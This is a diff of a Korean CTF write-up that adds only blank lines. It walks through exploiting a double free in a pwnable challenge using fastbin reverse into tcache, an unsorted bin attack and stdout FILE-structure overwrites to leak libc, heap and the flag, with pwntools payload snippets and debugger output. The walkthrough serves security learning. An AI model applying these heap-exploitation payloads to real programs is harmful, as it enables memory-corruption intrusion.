@@ -25,6 +25,7 @@ tags = ["ctf", "pwnable", "fastbin reverse into tcache", "unsorted bin", "fsop",
 3. Refund
 > 
 ```
+
 `buy_143A()`를 이용해서 heap chunk를 할당받고 할당된 주소와 `size`를 저장한다.
 
 각각 전역변수에 선언된 `void *ptr_4060[32]`, `int size_4160[32]`에 저장되며, `edit_1523()`에서는 `index`를 입력받아 `ptr_4060[index]`에 저장된 chunk의 내용을 수정할 수 있다.
@@ -32,6 +33,7 @@ tags = ["ctf", "pwnable", "fastbin reverse into tcache", "unsorted bin", "fsop",
 마찬가지로 `refund_15F6()`에서도 `index`를 입력받아 `ptr_4060[index]`에 저장된 chunk를 해제할 수 있다.
 
 참고로 `read_flag_12A9()`에서 `flag`를 읽어서 heap에 저장하므로 쉘까지는 따지 않아도 된다.
+
 
 ## 0x01. Vulnerability
 ``` c
@@ -52,13 +54,16 @@ int refund_15F6()
   return puts("DONE");
 }
 ```
+
 `refund_15F6()`에서 `ptr_4060[index]`가 `NULL`이 아닌지를 검증하고 `ptr`을 해제한다.
 
 이후 `size_4160[index]`는 0으로 초기화하지만 `ptr_4060[index]`는 초기화하지 않으므로 double free가 가능하다.
 
+
 ## 0x02. Exploit
 ### Fastbin reverse into tcache
 예전 버전의 glibc(<=2.26)에서는 가능했지만, 현재 docker 환경의 버전인 2.31에서는 tcache에는 double free를 방지하기 위한 mitigation이 적용되었다.
+
 ``` bash
 1. Buy a pet
 2. Edit name
@@ -80,6 +85,7 @@ Index: 0
 free(): double free detected in tcache 2
 [1]    97427 IOT instruction (core dumped)  ./chall
 ```
+
 따라서 이를 우회하기 위해 fastbin reverse into tcache 기법을 사용했는데, 다음 자료들을 참고했다.
 
 - [Heap exploit - Fastbin Reverse into Tcache](https://velog.io/@chk_pass/Heap-exploit-Fastbin-Reverse-into-Tcache)
@@ -97,6 +103,7 @@ free(): double free detected in tcache 2
 6. 할당받은 주소를 이용해 AAW
 
 한 단계씩 payload를 작성해보면,
+
 ``` python
     # fill tcache 0x20
     for _ in range(9):
@@ -109,9 +116,11 @@ free(): double free detected in tcache 2
     refund(s, 9)
     refund(s, 8)
 ```
+
 이렇게 `refund`를 `7`번 실행해서 tcache를 꽉 채우면 이후 chunk들을 fastbin으로 보내진다.
 
 이를 이용해서 fastbin에 `8 -> 9 -> 8` loop를 만든다.
+
 ``` python
     # clean tacahe 0x20
     for _ in range(7):
@@ -121,11 +130,13 @@ free(): double free detected in tcache 2
     buy(s, 0x10)
     edit(s, 8, b"\x40\x96")
 ```
+
 이후 tcache를 비우기 위해 `buy`를 `7`번 실행하고 한번 더 `buy`를 실행하면 `8`번째 chunk가 반환된다.
 
 이 `8`번째 chunk는 `buy`를 하면서 `size_4160[8]`에 `size`가 저장됐을 것이므로 `edit`이 가능하다.
 
 아직 heap leak을 하지 못했으므로 하위 바이트만 partial overwrite를 해서 확률적으로 heap manipulation이 가능하다.
+
 ``` bash
 gef➤  heap bins
 ─────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────
@@ -133,11 +144,13 @@ Tcachebins[idx=0, size=0x20, count=3] ←  Chunk(addr=0x555555559b70, size=0x20,
                                       ←  Chunk(addr=0x555555559b50, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  
                                       ←  Chunk(addr=0x555555559640, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
 ```
+
 이렇게 `edit`에서 입력한 `\x40\x96`이 chunk의 `next_chunk`를 부분적으로 덮어서 tcache list를 조작할 수 있다.
 
 잘 보면 tacahe list의 마지막에 `0x555555559640`이 오게 되는데 `size`가 `0`이지만 tcache에서 할당 시 `size` 검증을 하지 않아서 조작된 `next_chunk`의 할당이 이루어진다.
 
 생각해보니 heap chunk를 할당할 때 사이즈와 위치를 잘 조절해서 주소를 한 바이트만 overwrite해도 되게 만들면 확률 이슈 없이 exploit이 가능할 것 같긴 하다.
+
 ``` python
     # allocate overwritten heap address
     buy(0x10)
@@ -147,6 +160,7 @@ Tcachebins[idx=0, size=0x20, count=3] ←  Chunk(addr=0x555555559b70, size=0x20,
     # overwrite chunk size
     edit(s, 11, p64(0) + p64(0x421))
 ```
+
 위 payload처럼 `3`번째 `buy`를 할 때 partial overwrite를 한 주소가 반환되며, 이를 이용해 heap에 저장된 값을 변경할 수 있다.
 
 ### Unsorted bin attack
@@ -167,6 +181,7 @@ Tcachebins[idx=0, size=0x20, count=3] ←  Chunk(addr=0x555555559b70, size=0x20,
 이 때 victim chunk를 unsorted bin으로 보내기 위해 `next_chunk`와의 offset이 `size`와 일치하도록 중간에 chunk를 잘 배치해야 한다.
 
 또한 `next_chunk`가 top chunk일 경우 unsorted bin으로 가지 않고 top chunk에 병합되어버리기 때문에 이를 고려해야한다.
+
 ``` python
     # fill tcache 0x70
     for _ in range(8):
@@ -178,9 +193,11 @@ Tcachebins[idx=0, size=0x20, count=3] ←  Chunk(addr=0x555555559b70, size=0x20,
     # 0x555555559650 chunk goes to fastbin
     refund(s, 7)
 ```
+
 이렇게 `index 7` chunk(`0x555555559650`)가 fastbin에 보내졌으며 뒤에 `0x3a0` chunk를 할당받아 첫 번째 그림과 같은 형태가 되었다.
 
 이제 chunk size를 overwrite하기 위해 fastbin reverse into tcache 취약점을 이용한다.
+
 ``` python
     # partially overwrite next_chunk
     buy(s, 0x10)
@@ -194,11 +211,13 @@ Tcachebins[idx=0, size=0x20, count=3] ←  Chunk(addr=0x555555559b70, size=0x20,
     # overwrite chunk size
     edit(s, 11, p64(0) + p64(0x421))
 ```
+
 위 payload를 실행하면 두 번째 그림과 같아지며 `0x555555559650` chunk를 해제시켜주면 되는데 `0x555555559650`를 가리키는 포인터가 하나도 없다.
 
 해당 주소는 이미 해제된 chunk의 주소이기 때문에 다시 `0x60` 크기의 chunk를 할당받지 않는 한 접근할 수 없다.
 
 따라서 fastbin reverse into tcache 취약점을 한번 더 사용해서 해당 주소를 반환받는다.
+
 ``` python
     # partially overwrite next_chunk
     buy(s, 0x10)
@@ -212,7 +231,9 @@ Tcachebins[idx=0, size=0x20, count=3] ←  Chunk(addr=0x555555559b70, size=0x20,
     # free(0x555555559650) ; move chunk to unsorted bin
     refund(s, 15)
 ```
+
 이번에는 반환받은 주소를 `edit`하는게 아니라 `refund`를 해서 해제시켜주면 세 번째 그림과 같아진다.
+
 ``` bash
 gef➤  heap bins
 ───────────────────────────────── Fastbins for arena at 0x7ffff7fbfb80 ─────────────────────────────────
@@ -225,9 +246,11 @@ Fastbins[idx=6, size=0x80] 0x00
  →   Chunk(addr=0x555555559650, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
 [+] Found 1 chunks in unsorted bin.
 ```
+
 `0x555555559650` chunk는 여전히 fastbin에 있으므로 `next_chunk`에 담기게 된 `main_arena`가 다음 chunk로 해석되어 libc 영역을 할당받을 수 있게 되었다.
 
 다만 fastbin에서는 `size`에 대한 검증을 하므로 `0x421`로 overwrite한 chunk size를 다시 원복시켜야 한다.
+
 ``` python
     # restore chunk size
     edit(s, 11, p64(0) + p64(0x71))
@@ -239,19 +262,24 @@ Stdout의 `flag`를 변경할 수 있을 때 libc leak이 가능한 기법이 �
 - [stdout의 file structure flag를 이용한 libc leak](https://jeongzero.oopy.io/4c0f8878-4733-48aa-8ead-5f06a0e40490)
 
 Unsorted bin attack을 잘 수행하면 `0x555555559650` 주소에 담긴 `main_arena` 주소는 다음과 같다.
+
 ``` bash
 gef➤  x/4gx 0x555555559650 - 0x10
 0x555555559640: 0x0000000000000000      0x0000000000000071
 0x555555559650: 0x00007ffff7fbfbe0      0x00007ffff7fbfbe0
 ```
+
 한편 `stdout`은 libc 영역에 저장된 `_IO_FILE` 구조체를 가리키는데, 그 주소는 다음과 같다.
+
 ``` bash
 gef➤  x/6gx 0x555555558020
 0x555555558020 <stdout>:        0x00007ffff7fc06a0      0x0000000000000000
 0x555555558030 <stdin>:         0x00007ffff7fbf980      0x0000000000000000
 0x555555558040 <stderr>:        0x00007ffff7fc05c0      0x0000000000000000
 ```
+
 `0x7ffff7fbfbe0`와 `0x7ffff7fc06a0`는 ASLR이 없을 때는 주소값이 `3`바이트 차이가 나지만 ASLR이 켜져있을 때는 확률적으로 `2`바이트만 차이가 나므로 partial overwrite를 했을 때 1/16 확률로 exploit이 가능하다.
+
 ``` python
     # partially overwrite main_arena -> stdout
     buy(s, 0x60)
@@ -261,14 +289,18 @@ gef➤  x/6gx 0x555555558020
     for _ in range(3):
         buy(s, 0x60)
 ```
+
 따라서 1/16 확률로 `stdout`의 `_IO_FILE` 구조체가 저장된 libc 주소를 할당받게 된다면 `flag`를 바꿔 libc 주소를 출력할 수 있다.
 
 Exploit 테크닉을 요약하자면 `flag`에 `_IO_IS_APPENDING`을 추가했을 때 다음과 같이 `_IO_new_do_write`가 호출되므로 `_IO_write_base`, `_IO_write_ptr`을 잘 조작해주면 된다.
+
 ``` c
 // _IO_do_write (FILE *fp, const char *data, size_t to_do)
 _IO_do_write (stdout, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base)
 ```
+
 값을 변경하기 전 `stdout`의 `_IO_FILE` 구조체의 상태는 다음과 같다.
+
 ``` bash
 gef➤  p *(struct _IO_FILE *) 0x7ffff7fc06a0
 $1 = {
@@ -284,12 +316,16 @@ $1 = {
   ...
 }
 ```
+
 참고한 자료에서는 `_IO_write_base`의 첫 바이트를 `\x00`으로 overwrite하는데, 그러면 다음과 같이 `_IO_do_write`가 호출될 것이다.
+
 ``` c
 // _IO_do_write (FILE *fp, const char *data, size_t to_do)
 _IO_do_write (stdout, 0x7ffff7fc0700, 0x23)
 ```
+
 이 출력의 결과물로 `_IO_FILE` 구조체에 담겨있던 libc 주소가 출력된다.
+
 ``` python
     # leak libc
     io_is_appending = 0x1000
@@ -297,6 +333,7 @@ _IO_do_write (stdout, 0x7ffff7fc0700, 0x23)
     payload += b"\x00" * 0x19
     r = edit(s, 25, payload)
 ```
+
 위 payload를 통해 libc leak이 가능한 것으로 보아 `_IO_read_XXX`같은 영역은 출력을 할 때 중요하지 않는 듯하다.
 
 이 `stdout` 구조체를 이용해서 AAR이 가능하고 바이너리에서 `flag`를 읽은 후 heap 메모리에 저장하므로 heap 주소만 있으면 `flag`를 획득할 수 있다.
@@ -304,6 +341,7 @@ _IO_do_write (stdout, 0x7ffff7fc0700, 0x23)
 Unsorted bin attack에서 `next_chunk`에 `main_arena` 주소가 담기게 한 것과 반대로 `main_arena`에는 heap 주소가 담겨있다.
 
 `main_arena`는 libc의 고정된 영역에 저장된 변수이므로 offset을 계산해서 값을 덮어주면 된다.
+
 ``` python
     # leak heap - print main_arena
     payload = p64(0xfbad2887 | io_is_appending)
@@ -313,9 +351,11 @@ Unsorted bin attack에서 `next_chunk`에 `main_arena` 주소가 담기게 한 �
     payload += p64(main_arena + 0x20)   # _IO_write_end
     r = edit(s, 25, payload)
 ```
+
 주의해야 할 점은 `_IO_write_end`가 `_IO_write_ptr`과 같아야 출력이 된다는 점이다.
 
 알아뒀다가 나중에 `stdout`을 이용해 메모리 leak을 해야할 때 활용해야겠다.
+
 ``` python
     # print flag
     payload = p64(0xfbad2887 | io_is_appending)
@@ -325,7 +365,9 @@ Unsorted bin attack에서 `next_chunk`에 `main_arena` 주소가 담기게 한 �
     payload += p64(flag + 0x30)         # _IO_write_end
     r = edit(s, 25, payload)
 ```
+
 Heap 주소를 획득한 뒤 같은 방식으로 `flag`를 획득할 수 있다.
+
 
 ## 0x03. Payload
 ``` python
